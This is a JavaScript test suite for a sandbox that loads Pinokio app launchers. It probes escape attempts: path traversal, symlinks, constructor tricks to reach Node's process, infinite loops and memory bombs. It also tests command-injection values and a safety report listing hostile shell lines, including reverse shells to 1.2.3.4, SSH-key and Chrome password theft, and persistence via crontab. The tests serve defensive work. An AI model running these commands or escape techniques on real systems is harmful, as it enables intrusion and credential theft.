// Pinokio launchers that build their steps in code: module.exports = async (kernel) => ({ … }).
// They run in the same locked-down vm as every script, get a frozen kernel and
// may only read .js/.json files inside the app folder. These tests try to get out.
const { test } = require("node:test")
const assert = require("node:assert/strict")
const fs = require("node:fs")
const os = require("node:os")
const path = require("node:path")
const { loadScript, plan, render, commandsOf, hfCommand } = require("../lib/script")

const CTX = { platform: "win32", arch: "x64", gpu: "nvidia", gpu_model: "NVIDIA GeForce RTX 5090", gpus: ["nvidia"], args: {}, input: {}, port: 42011, env: {} }

// an app folder next to a "secret" folder it must not reach
function app(files) {
  const top = fs.mkdtempSync(path.join(os.tmpdir(), "obstat-launcher-"))
  const dir = path.join(top, "app")
  fs.mkdirSync(path.join(top, "secret"))
  fs.writeFileSync(path.join(top, "secret", "evil.js"), `module.exports = "outside"`)
  fs.writeFileSync(path.join(top, "secret", "evil.json"), `"outside"`)
  for (const [name, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true })
    fs.writeFileSync(path.join(dir, name), text)
  }
  return { dir, top, file: (n) => path.join(dir, n) }
}
const message = (file, ctx = CTX) => loadScript(file, { root: path.dirname(file), ctx }).run[0].params.message

test("a launcher that's a function of kernel builds its steps, with local config files", () => {
  const a = app({
    "config.js": `module.exports = { torch: true }`,
    "pre.js": `const extra = require("./data/extra.json"); module.exports = (config, kernel) => config.torch && kernel.gpu === "nvidia" && / 50.+/.test(kernel.gpu_model) ? "cu128 " + extra.pkg : "cu121"`,
    "data/extra.json": `{ "pkg": "xformers" }`,
    "install.js": `const config = require("./config.js"), pre = require("./pre")
      module.exports = async (kernel, info) => {
        const port = await kernel.port()
        return { daemon: true, cmds: { a: "from self" }, run: [{ method: "shell.run", params: { message: [pre(config, kernel), kernel.platform, kernel.arch, String(port), kernel.gpus[0].model, typeof info.cwd] } }] }
      }`,
  })
  const s = loadScript(a.file("install.js"), { root: a.dir, ctx: CTX })
  assert.equal(s.daemon, true)
  assert.deepEqual(s.run[0].params.message, ["cu128 xformers", "win32", "x64", "42011", "NVIDIA GeForce RTX 5090", "string"])
  assert.equal(s.self.cmds.a, "from self")
  assert.deepEqual(message(a.file("install.js"), { ...CTX, gpu_model: "NVIDIA GeForce RTX 4090" })[0], "cu121")
})

test("kernel is frozen and only has what launchers read", () => {
  const a = app({ "x.js": `module.exports = (kernel) => {
    "use strict";
    var tries = [function () { kernel.gpu = "amd" }, function () { kernel.port = null }, function () { kernel.gpus.push(1) }, function () { kernel.script.exists = null }]
      .map(function (f) { try { f(); return "changed" } catch (e) { return "frozen" } });
    return { run: [{ method: "notify", params: { message: tries.concat(Object.keys(kernel).sort().join(",")) } }] }
  }` })
  assert.deepEqual(message(a.file("x.js")), ["frozen", "frozen", "frozen", "frozen", "arch,exists,gpu,gpu_model,gpus,path,platform,port,script"])
})

test("require only reaches .js and .json files inside the app folder", () => {
  const a = app({ "ok.js": `module.exports = 1`, "notes.txt": "hi" })
  fs.symlinkSync(path.join(a.top, "secret", "evil.js"), path.join(a.dir, "link.js"))
  fs.symlinkSync(path.join(a.top, "secret"), path.join(a.dir, "linkdir"))
  const tries = [
    `require("fs")`, `require("node:fs")`, `require("child_process")`, `require("module")`, `require("vm")`,
    `require("../secret/evil.js")`, `require("../secret/evil")`, `require("../secret/evil.json")`, `require("./../../" + ${JSON.stringify(path.basename(a.top))} + "/secret/evil.js")`,
    `require(${JSON.stringify(path.join(a.top, "secret", "evil.js"))})`, `require("/etc/passwd")`,
    `require("./link.js")`, `require("./linkdir/evil.js")`, `require("./notes.txt")`, `require("./missing.js")`,
    `require("./ok.js/../../secret/evil.js")`, `require(".." + "/secret/evil")`,
  ]
  for (const t of tries) {
    fs.writeFileSync(a.file("x.js"), `module.exports = { run: [{ method: "notify", params: { message: ${t} } }] }`)
    assert.throws(() => loadScript(a.file("x.js"), { root: a.dir }), /doesn't allow|isn't a \.js or \.json file inside the app folder/, t)
  }
  // and a module that tries the same from inside a launcher function
  fs.writeFileSync(a.file("y.js"), `module.exports = async () => ({ run: [{ method: "notify", params: { message: require("../secret/evil.js") } }] })`)
  assert.throws(() => loadScript(a.file("y.js"), { root: a.dir }), /isn't a \.js or \.json file inside/)
})

test("exists() and kernel.exists() only see inside the app folder", () => {
  const a = app({ "app/README.md": "x" })
  fs.symlinkSync(path.join(a.top, "secret"), path.join(a.dir, "out"))
  const secret = path.join(a.top, "secret", "evil.js")
  fs.writeFileSync(a.file("x.js"), `module.exports = (kernel) => ({ run: [{ method: "notify", params: { message: [
    kernel.exists("app"), kernel.exists("app/README.md"), kernel.script.exists(__dirname, "app"), kernel.exists("nope"),
    kernel.exists("../secret/evil.js"), kernel.exists(${JSON.stringify(secret)}), kernel.exists("out"), kernel.exists("out/evil.js"), kernel.exists("/etc/passwd"),
  ] } }] })`)
  assert.deepEqual(message(a.file("x.js")), [true, true, true, false, false, false, false, false, false])
  const ctx = { ...CTX, cwd: a.dir }
  assert.equal(render("{{exists('app') && !exists('nope')}}", ctx, a.dir), true)
  assert.equal(render("{{exists('../secret/evil.js') || exists('out/evil.js') || exists(" + JSON.stringify(secret) + ")}}", ctx, a.dir), false)
  assert.equal(render("{{kernel.script.exists(cwd, 'app/README.md')}}", ctx, a.dir), true)
})

test("templates get cwd, path, self, exists and kernel like Pinokio's", () => {
  const a = app({})
  const ctx = { ...CTX, cwd: a.dir, self: { cmds: { nvidia: "pip install torch-cu" } } }
  assert.equal(render("{{cwd}}", ctx, a.dir), a.dir)
  assert.equal(render("{{path.resolve(cwd, 'app')}}", ctx, a.dir), path.join(a.dir, "app"))
  assert.equal(render("{{gpu === 'nvidia' ? self.cmds.nvidia : 'cpu'}}", ctx, a.dir), "pip install torch-cu")
  assert.equal(render("{{gpu === 'nvidia' && kernel.gpu_model && / 50.+/.test(kernel.gpu_model)}}", ctx, a.dir), true)
  assert.ok(render("{{kernel.gpus && kernel.gpus.find(x => / 50.+/.test(x.model))}}", ctx, a.dir))
  assert.equal(render("{{kernel.gpu_model && / 50.+/.test(kernel.gpu_model)}}", { ...ctx, gpu_model: null }, a.dir), null)
  // kernel.path names a folder in the app, never outside it
  assert.equal(render("{{kernel.path('cache/x')}}", ctx, a.dir), path.join(a.dir, "cache", "x"))
  assert.equal(render("{{kernel.path('..', '..', 'etc')}}", ctx, a.dir), a.dir)
})

test("launcher code, local modules and templates can't reach Node", () => {
  const a = app({
    "helper.js": `module.exports = [
      function () { return this.constructor.constructor("return typeof process")() },
      function () { return require.constructor("return typeof process")() },
      function () { return typeof process + typeof global + typeof globalThis.process },
    ].map(function (f) { try { return f() } catch (e) { return "blocked" } })`,
    "x.js": `const helper = require("./helper.js")
      module.exports = async (kernel, info) => {
        const tries = [
          () => kernel.port.constructor("return typeof process")(),
          () => kernel.constructor.constructor("return typeof process")(),
          () => kernel.port().constructor.constructor("return typeof process")(),
          () => info.exists.constructor("return typeof process")(),
          () => (function* () {}).constructor("return typeof process")().next().value,
          () => {
            // every frame on the stack, including Obstat's own: none leads to process
            Error.prepareStackTrace = (e, frames) => frames.map((c) => {
              const self = c.getThis(), fn = c.getFunction()
              return typeof (self && self.process) + "," + (fn ? fn.constructor("return typeof process")() : "none")
            }).join(";")
            return new Error().stack
          },
          () => { try { null.x } catch (e) { return e.constructor.constructor("return typeof process")() } },
          () => typeof require("os").homedir.constructor("return process")(),
        ].map((f) => { try { return String(f()) } catch (e) { return "blocked" } })
        return { run: [{ method: "notify", params: { message: tries.concat(helper) } }] }
      }`,
  })
  const out = message(a.file("x.js"))
  for (const t of out) assert.doesNotMatch(String(t), /object|function/, `reached Node: ${out}`)
  assert.equal(render("{{kernel.constructor.constructor('return typeof process')()}}", { ...CTX, cwd: a.dir }, a.dir), "undefined")
  assert.equal(render("{{exists.constructor('return typeof process')()}}", { ...CTX, cwd: a.dir }, a.dir), "undefined")
})

test("a launcher can't hang Obstat: loops, endless promises and hostile results all stop", () => {
  const a = app({ "loop.js": `for (;;) {}` })
  const cases = {
    "a.js": `module.exports = async () => { for (;;) {} }`,
    "b.js": `module.exports = async () => { while (true) await 0 }`,
    "c.js": `module.exports = () => new Promise(() => {})`,
    "d.js": `Promise.resolve().then(function f() { for (;;) {} }); module.exports = { run: [] }`,
    "e.js": `require("./loop.js"); module.exports = { run: [] }`,
    "f.js": `module.exports = { get run() { for (;;) {} } }`,
    "h.js": `throw new Proxy({}, { getPrototypeOf: function () { for (;;) {} }, get: function () { for (;;) {} } })`,
    "i.js": `module.exports = async () => { throw new Proxy({}, { get: function () { for (;;) {} } }) }`,
    "j.js": `module.exports = (k) => { for (var i = 0; i < 1e9; i++) k.exists("f" + i); return { run: [] } }`,
    "k.js": `module.exports = () => ({ run: [], then: function () { for (;;) {} } })`,
  }
  for (const [name, code] of Object.entries(cases)) {
    fs.writeFileSync(a.file(name), code)
    const t = Date.now()
    assert.throws(() => loadScript(a.file(name), { root: a.dir }), /Couldn't read|doesn't export/, name)
    assert.ok(Date.now() - t < 20000, `${name} took ${Date.now() - t}ms`)
  }
  // replacing JSON doesn't change what Obstat reads back
  fs.writeFileSync(a.file("g.js"), `JSON.stringify = function () { return { toString: function () { for (;;) {} } } }; JSON.parse = null; module.exports = { run: [1] }`)
  assert.deepEqual(loadScript(a.file("g.js"), { root: a.dir }).run, [1])
  // a memory bomb hits the thread's memory cap instead of Obstat's
  fs.writeFileSync(a.file("m.js"), `var a = []; for (;;) a.push(new Array(1e6).fill(1))`)
  assert.throws(() => loadScript(a.file("m.js"), { root: a.dir }), /took too long/)
  // templates too: a loop comes back as nothing, and replacing JSON or queueing an endless promise job changes nothing
  assert.equal(render("{{(function () { for (;;) {} })()}}", {}), undefined)
  assert.equal(render("{{(JSON.stringify = function () { return { toString: function () { for (;;) {} } } }, 1)}}", {}), 1)
  assert.equal(render("{{(async function () { await 0; for (;;) {} })() && 'x'}}", {}), undefined)
})

test("old install.json/start.json scripts load like their .js twins", () => {
  const a = app({ "start.json": JSON.stringify({ daemon: true, run: [{ method: "shell.run", params: { message: "python app.py" } }] }), "bad.json": "{ nope" })
  const s = loadScript(a.file("start.json"))
  assert.equal(s.daemon, true)
  assert.equal(s.run[0].params.message, "python app.py")
  assert.throws(() => loadScript(a.file("bad.json")), /isn't valid JSON/)
  // what Obstat writes next to them is a one-line require
  fs.writeFileSync(a.file("start.js"), `module.exports = require("./start.json")\n`)
  assert.equal(loadScript(a.file("start.js")).run[0].params.message, "python app.py")
})

test("plan shows fs.copy, hf.download, jump and proxy steps instead of stopping on them", () => {
  const a = app({ "install.js": `module.exports = async (kernel) => ({ run: [
    { method: "fs.copy", params: { src: "a.txt", dest: "app/a.txt" } },
    { method: "hf.download", params: { path: "app", _: ["org/model", "weights.bin"], "local-dir": "models/m" } },
    { id: "again", method: "jump", params: { id: "end" } },
    { method: "proxy.start", params: { uri: "{{local.url}}" } },
    { id: "end", method: "notify", params: { html: "done" } },
  ] })` })
  const steps = plan(a.file("install.js"), CTX)
  assert.deepEqual(steps.map((s) => s.method), ["fs.copy", "hf.download", "jump", "proxy.start", "notify"])
  assert.ok(steps.every((s) => !s.unsupported))
  assert.deepEqual(commandsOf(steps).map((c) => c.command), ['python -I -m pip install --quiet "huggingface_hub>=0.34"', 'hf download org/model "weights.bin" --local-dir "models/m"'])
  assert.equal(steps[2].to, "end")
})

test("hf.download only builds a plain hf download command", () => {
  assert.equal(hfCommand({ _: ["microsoft/VibeVoice-Realtime-0.5B"], "local-dir": "models/VibeVoice-Realtime-0.5B" }).command,
    'hf download microsoft/VibeVoice-Realtime-0.5B --local-dir "models/VibeVoice-Realtime-0.5B"')
  assert.equal(hfCommand({ _: ["org/m"], include: ["*.safetensors", "*.json"], "repo-type": "dataset" }).command,
    'hf download org/m --include "*.safetensors" --include "*.json" --repo-type "dataset"')
  for (const bad of [
    { _: ["org/m && calc"] }, { _: ["../m"] }, { _: [] }, { _: ["org/m", "a\" & calc & \""] }, { _: ["org/m", "$(id)"] }, { _: ["org/m", "%PATH%"] },
    { _: ["org/m"], "local-dir": "/etc" }, { _: ["org/m"], "local-dir": "../../x" }, { _: ["org/m"], "local-dir": "C:\\Windows" },
    { _: ["org/m"], token: "hf_x" }, { _: ["org/m"], endpoint: "https://evil.example" }, { _: ["org/m"], "repo-type": "x" }, { _: ["org/m", "--token=x"] },
  ]) assert.throws(() => hfCommand(bad), /hf\.download/, JSON.stringify(bad))
})

test("launcher code gets the same answer every time: no clock, randomness or GC timing", () => {
  const a = app({ "install.js": `
    const bits = [Math.random(), Date.now(), new Date().getTime(), String(Date()).length > 0, typeof Intl, typeof WeakRef, typeof FinalizationRegistry, typeof SharedArrayBuffer, typeof WebAssembly, new Date(0).constructor === Date]
    module.exports = { run: [{ method: "shell.run", params: { message: JSON.stringify(bits) } }] }` })
  const seen = new Set()
  for (let i = 0; i < 6; i++) seen.add(loadScript(a.file("install.js"), { root: a.dir, ctx: CTX }).run[0].params.message)
  assert.equal(seen.size, 1)
  assert.deepEqual(JSON.parse([...seen][0]), [0.5, 1767225600000, 1767225600000, true, "undefined", "undefined", "undefined", "undefined", "undefined", true])
})

test("templates get no clock or randomness either", () => {
  assert.equal(render("{{Math.random()}}-{{Date.now()}}-{{typeof Intl}}", { platform: "linux" }), "0.5-1767225600000-undefined")
})

test("a launcher that returns huge steps is refused", () => {
  const a = app({ "install.js": `module.exports = { run: Array.from({ length: 1500 }, () => ({ method: "shell.run", params: { message: "x".repeat(1000) } })) }` })
  assert.throws(() => loadScript(a.file("install.js"), { root: a.dir, ctx: CTX }), /too big/)
})

test("a relative path to a launcher still finds its files", () => {
  const a = app({ "config.js": `module.exports = { cmd: "echo ok" }`, "install.js": `const c = require("./config.js"); module.exports = { run: [{ method: "shell.run", params: { message: c.cmd } }] }` })
  assert.equal(loadScript(path.relative(process.cwd(), a.file("install.js"))).run[0].params.message, "echo ok")
})

test("a plan shows a step's environment variables with its commands", () => {
  const a = app({ "install.js": `module.exports = { run: [{ method: "shell.run", params: { message: "python app.py", env: { PYTHONSTARTUP: "evil.py" } } }] }` })
  assert.deepEqual(commandsOf(plan(a.file("install.js"), CTX))[0].env, ["PYTHONSTARTUP=evil.py"])
})

test("the safety report flags the usual Mac and Linux tricks, and leaves ordinary installs alone", () => {
  const risks = (c) => commandsOf([{ commands: [c] }])[0].risks
  const flagged = {
    "echo aGVsbG8= | base64 -d | sh": "runs hidden, encoded commands",
    'eval "$(curl -fsSL https://x.sh)"': "runs hidden, encoded commands",
    "bash <(curl -s https://x.sh)": "runs hidden, encoded commands",
    "crontab -l | { cat; echo '* * * * * ~/x'; } | crontab -": "changes system settings or startup",
    "launchctl load ~/Library/LaunchAgents/x.plist": "changes system settings or startup",
    "systemctl --user enable x.service": "changes system settings or startup",
    "echo 'export X=1' >> ~/.zshrc": "changes system settings or startup",
    "cp ~/.ssh/id_rsa /tmp/k": "reads passwords, keys or browser data",
    "security find-generic-password -s 'Chrome Safe Storage' -w": "reads passwords, keys or browser data",
    "cat ~/obstat/keys.json": "reads passwords, keys or browser data",
    "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data x": "reads passwords, keys or browser data",
    "xattr -d com.apple.quarantine ./tool": "turns off one of the Mac's safety checks",
    "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1": "opens a connection someone could control this computer through",
    "nc -e /bin/sh 1.2.3.4 4444": "opens a connection someone could control this computer through",
  }
  for (const [c, why] of Object.entries(flagged)) assert.ok(risks(c).includes(why), `${c} -> ${risks(c)}`)
  for (const c of ["uv pip install -r requirements.txt", "npm install", "git clone https://github.com/a/b app", "python app.py --port 7860", "echo done >> log.txt", "ffmpeg -i in.wav out.mp3", "pip install keyring"]) {
    assert.deepEqual(risks(c), [], c)
  }
})
